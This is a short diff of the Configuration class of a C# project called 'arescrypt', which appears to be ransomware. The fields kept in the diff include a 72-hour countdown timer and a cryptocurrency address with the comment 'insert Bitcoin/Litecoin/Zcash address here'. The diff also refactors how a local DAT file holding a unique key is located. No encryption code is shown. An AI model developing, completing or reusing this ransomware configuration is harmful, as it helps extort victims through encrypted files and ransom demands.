@@ -1,7 +1,4 @@
-﻿using System;
-using System.IO;
-
-namespace arescrypt
+﻿namespace arescrypt
 {
     class Configuration
     {
@@ -22,13 +19,15 @@ namespace arescrypt
         public int riseTimer_Hours = 0x48; public int riseTimer_Minutes = 0x0; public int riseTimer_Seconds = 0x0;
         public string cryptoAddress = "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"; // insert Bitcoin/Litecoin/Zcash address here
 
-        // Variables to be set by GetDATData()
-        public string uniqueKey;
-        // Extract data from generated DAT file
-        public void GetDATData()
-        {
-            if (!File.Exists("arescrypt.dat"))
-                File.Create("arescrypt.dat"); // Create new DAT file
-        }
+        // DAT file configuration
+        public string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";
+        // Variables to be set by GetDATFileData()
+
+        public string uniqueKey { get; set; }
+    }
+
+    class Config
+    {
+        public string uniqueKey { get; set; }
     }
 }
